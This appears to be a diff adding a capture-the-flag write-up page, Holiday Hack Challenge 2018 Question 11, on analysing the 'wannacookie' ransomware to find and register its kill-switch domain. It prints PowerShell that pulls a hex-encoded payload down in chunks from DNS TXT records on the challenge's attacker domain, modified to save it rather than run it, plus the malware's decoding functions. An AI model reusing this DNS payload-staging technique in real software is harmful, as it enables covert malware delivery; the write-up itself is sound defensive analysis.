@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>Question 11 &mdash; Holiday Hack Challenge 2018 Report  documentation</title>
+  <title>Question 11: Stop the Malware &mdash; Holiday Hack Challenge 2018 Report  documentation</title>
   
 
   
@@ -91,9 +91,17 @@
 <li class="toctree-l1"><a class="reference internal" href="question8.html">Question 8: Network Traffic Forensics</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question9.html">Question 9: Catch the Malware</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question10.html">Question 10: Identify the Domain</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Question 11</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Question 11: Stop the Malware</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#step-1-safely-obtain-the-malware">Step 1: Safely obtain the malware</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-2-find-the-killswitch">Step 2: Find the killswitch</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-3-activate-the-kill-switch">Step 3: Activate the kill-switch</a></li>
+</ul>
+</li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="question12.html">Question 12: Recover Alabaster’s Password</a></li>
-<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13: Santa’s Door</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question14.html">Question 14: Who Is Behind It All?</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Terminals:</span></p>
@@ -159,7 +167,7 @@
     
       <li><a href="../index.html">Docs</a> &raquo;</li>
         
-      <li>Question 11</li>
+      <li>Question 11: Stop the Malware</li>
     
     
       <li class="wy-breadcrumbs-aside">
@@ -176,8 +184,215 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="question-11">
-<h1>Question 11<a class="headerlink" href="#question-11" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="question-11-stop-the-malware">
+<h1>Question 11: Stop the Malware<a class="headerlink" href="#question-11-stop-the-malware" title="Permalink to this headline">¶</a></h1>
+<div class="line-block">
+<div class="line">Analyze the full malware source code to find a kill-switch and activate it at the North Pole’s domain registrar <a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>.</div>
+<div class="line">What is the full sentence text that appears on the domain registration success message (bottom sentence)?</div>
+</div>
+<p>Answer: <em>Successfully registered yippeekiyaa.aaay!</em></p>
+<div class="section" id="solution">
+<h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="step-1-safely-obtain-the-malware">
+<h3>Step 1: Safely obtain the malware<a class="headerlink" href="#step-1-safely-obtain-the-malware" title="Permalink to this headline">¶</a></h3>
+<p>We started with the <code class="docutils literal notranslate"><span class="pre">WannacookieLoader.ps1</span></code> code from <a class="reference internal" href="question10.html"><span class="doc">Question 10</span></a>.</p>
+<p>We modified the <code class="docutils literal notranslate"><span class="pre">WannacookieLoader.ps1</span></code> code as shown below. Line 10 saves the output, which is the malware, to a file (<strong>wannacookie.min.ps1</strong>) instead of executing it.</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$o</span>
+ <span class="p">}</span>
+ <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span>
+ <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span>
+ <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
+   <span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span>
+ <span class="p">}</span>
+<span class="hll"> <span class="p">$(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="s1">&#39;E:\Temp\wannacookie.min.ps1&#39;</span><span class="p">)</span>
+</span></pre></div>
+</td></tr></table></div>
+<p>We ran the above code to ensure that it worked but then utilised Alabaster’s hint to download a non-minified version of the malware called <strong>wannacookie.ps1</strong>.</p>
+<p>To download <strong>wannacookie.ps1</strong> we made the following changes to the above code:</p>
+<ul class="simple">
+<li>In line 5 we changed the HEX encoded string to represent <code class="docutils literal notranslate"><span class="pre">wannacookie.ps1</span></code> instead of <code class="docutils literal notranslate"><span class="pre">wannacookie.min.ps1</span></code></li>
+<li>In line 10 we changed the output file name to <code class="docutils literal notranslate"><span class="pre">wannacookie.ps1</span></code></li>
+</ul>
+<p>The resulting code is shown below:</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$o</span>
+ <span class="p">}</span>
+<span class="hll"> <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E707331&quot;</span>
+</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span>
+ <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
+   <span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span>
+ <span class="p">}</span>
+<span class="hll"> <span class="p">$(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="s1">&#39;E:\Temp\wannacookie.ps1&#39;</span><span class="p">)</span>
+</span></pre></div>
+</td></tr></table></div>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">The remaining part of this solution as well as the answer to <a class="reference internal" href="question12.html"><span class="doc">Question 12</span></a> were based on <strong>wannacookie.ps1</strong> instead of <strong>wannacookie.min.ps1</strong>.</p>
+</div>
+</div>
+<div class="section" id="step-2-find-the-killswitch">
+<h3>Step 2: Find the killswitch<a class="headerlink" href="#step-2-find-the-killswitch" title="Permalink to this headline">¶</a></h3>
+<p>The <strong>wannacookie.ps1</strong> code contained a function called <strong>wannacookie</strong>. Part of this function included the following code:</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span>
+<span class="hll"><span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span><span class="k">return</span><span class="p">}</span>
+</span></pre></div>
+</td></tr></table></div>
+<p>Line 2 exits out of the function without doing anything if a certain DNS resolution returns something rather than null. In other words, this line checks for the kill-switch that is referred to in this question.</p>
+<p>To determine the DNS name we borrowed existing functions from <strong>wannacookie.ps1</strong> to create the following code:</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">)</span>
+   <span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>
+   <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span>
+       <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">G2B</span> <span class="p">{</span>
+<span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">)</span>
+       <span class="k">Process</span> <span class="p">{</span>
+       <span class="nv">$SrcData</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span> <span class="p">,</span> <span class="nv">$Data</span> <span class="p">)</span>
+           <span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+       <span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$SrcData</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
+           <span class="nv">$gStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span> <span class="nv">$output</span> <span class="p">)</span>
+       <span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+               <span class="nv">$SrcData</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+               <span class="no">[byte[]]</span> <span class="nv">$byteArr</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
+       <span class="k">return</span> <span class="nv">$byteArr</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">B2H</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$DEC</span><span class="p">)</span>
+   <span class="nv">$tmp</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+   <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$DEC</span><span class="p">){</span>
+       <span class="nv">$a</span> <span class="p">=</span> <span class="s2">&quot;{0:x}&quot;</span> <span class="o">-f</span> <span class="no">[Int]</span><span class="nv">$value</span>
+       <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">1</span><span class="p">){</span>
+           <span class="nv">$tmp</span> <span class="p">+=</span> <span class="s1">&#39;0&#39;</span> <span class="p">+</span> <span class="nv">$a</span>
+       <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+           <span class="nv">$tmp</span> <span class="p">+=</span> <span class="nv">$a</span>
+       <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$tmp</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">ti_rox</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$b1</span><span class="p">,</span> <span class="nv">$b2</span><span class="p">)</span>
+   <span class="nv">$b1</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b1</span><span class="p">)</span>
+   <span class="nv">$b2</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b2</span><span class="p">)</span>
+   <span class="nv">$cont</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span>
+   <span class="k">if</span> <span class="p">(</span><span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="o">-eq</span> <span class="nv">$b2</span><span class="p">.</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>
+       <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span>
+       <span class="p">{</span>
+           <span class="nv">$cont</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$b1</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$b2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
+       <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$cont</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">H2A</span><span class="p">()</span> <span class="p">{</span>
+   <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+   <span class="nv">$outa</span>
+   <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$outa</span> <span class="p">=</span> <span class="nv">$outa</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$outa</span>
+<span class="p">}</span>
+
+<span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span>
+<span class="nv">$name</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">)))</span>
+
+<span class="nb">Write-Host</span> <span class="nv">$name</span>
+</pre></div>
+</td></tr></table></div>
+<p>The functions in lines 1 to 56 of the above code simply perform various mathematical translations. For example, H2A converts from HEX to ASCII.</p>
+<p>Running this code returned <code class="docutils literal notranslate"><span class="pre">yippeekiyaa.aaay</span></code>.</p>
+</div>
+<div class="section" id="step-3-activate-the-kill-switch">
+<h3>Step 3: Activate the kill-switch<a class="headerlink" href="#step-3-activate-the-kill-switch" title="Permalink to this headline">¶</a></h3>
+<p>We activated <code class="docutils literal notranslate"><span class="pre">yippeekiyaa.aaay</span></code> at the North Pole’s domain registrar <a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>.</p>
+<p>The registrar returned <strong>Successfully registered yippeekiyaa.aaay!</strong></p>
+</div>
+</div>
 </div>
 
 
@@ -203,8 +418,7 @@
         &copy; Copyright 2019, Antonios and Peter Lapornik
 
     </p>
-  </div>
-  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+  </div> 
 
 </footer>
 
